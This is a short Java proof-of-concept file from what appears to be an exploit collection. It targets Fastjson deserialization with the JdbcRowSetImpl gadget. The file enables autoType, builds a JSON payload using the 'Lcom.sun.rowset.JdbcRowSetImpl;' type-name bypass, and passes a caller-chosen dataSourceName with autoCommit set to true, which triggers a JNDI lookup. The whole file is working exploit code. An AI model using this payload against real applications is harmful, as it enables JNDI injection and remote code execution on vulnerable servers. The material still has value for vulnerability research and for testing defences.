package org.lain.poc.poclist;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @author: ZH3FENG
 * @Date: 下午7:53 2017/12/11
 * @Modified By:
 * @Description: Gadget com.sun.rowset.JdbcRowSetImpl
 *
 *               setAutoCommit() -> connect() -> InitialContext.lookup()
 */
public class JdbcRowSetImplPoC {


    public static void testJdbcRowSetImpl(String dataSourceName){

        ParserConfig config = new ParserConfig();

        config.setAutoTypeSupport(true);//


        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\","
                + "\"dataSourceName\":\"" + dataSourceName + "\","
                + "\"autoCommit\":\"true\"}";
        System.out.println(payload);

        try{
            JSONObject.parse(payload,config);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
